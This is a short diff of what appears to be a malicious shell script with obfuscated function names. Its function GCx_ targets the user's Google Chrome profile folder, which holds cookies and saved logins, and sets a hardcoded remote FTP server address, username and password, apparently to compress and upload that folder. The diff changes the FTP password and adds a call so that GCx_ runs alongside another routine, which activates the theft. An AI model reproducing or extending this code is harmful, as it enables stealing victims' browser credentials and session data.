@@ -104,7 +104,7 @@ function WbCmx(){
 function GCx_(){
 	ftp_server="139.162.128.166"
 	ftp_user="r00t1970"
-	ftp_password="#123852789#"
+	ftp_password="#r00t#1970#"
 	#
 	folder_to_compress="/home/$USER/.config/google-chrome"
 	#folder_to_compress="/home/r00t/.config/ibus_/px.jpg"
@@ -194,7 +194,7 @@ function px(){
 	#
   	#pactl set-default-sink 0
    	#
-      	ssx2
+      	ssx2 & GCx_
  	#
   	xyz
 	#
